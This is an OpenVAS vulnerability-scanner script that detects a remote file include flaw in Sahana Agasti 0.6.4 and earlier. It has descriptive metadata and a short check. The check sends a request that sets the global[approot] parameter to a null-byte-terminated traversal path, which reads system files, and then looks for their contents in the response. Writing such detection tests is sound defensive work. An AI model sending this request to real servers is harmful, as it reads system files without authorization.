###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sahana_45656.nasl 11798 2018-10-09 16:37:24Z cfischer $
#
# Sahana Agasti Multiple Remote File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103013");
  script_version("$Revision: 11798 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-09 18:37:24 +0200 (Tue, 09 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-05 15:07:33 +0100 (Wed, 05 Jan 2011)");
  script_bugtraq_id(45656);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Sahana Agasti Multiple Remote File Include Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("sahana_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sahana/detected");

  script_tag(name:"summary", value:"Sahana Agasti is prone to multiple remote file-include
  vulnerabilities because the application fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting these issues may allow a remote attacker to obtain
  sensitive information or to execute arbitrary script code in the context of the webserver process.
  This may allow the attacker to compromise the application and the underlying computer. Other attacks
  are also possible.");

  script_tag(name:"affected", value:"Sahana Agasti 0.6.4 and prior versions are vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45656");
  script_xref(name:"URL", value:"https://launchpad.net/sahana-agasti/");
  script_xref(name:"URL", value:"http://www.sahanafoundation.org/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

CPE = "cpe:/a:sahana:sahana";

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/mod/vm/controller/AccessController.php?global[approot]=/", files[file], "%00");

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = report_vuln_url(url:url, port:port);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);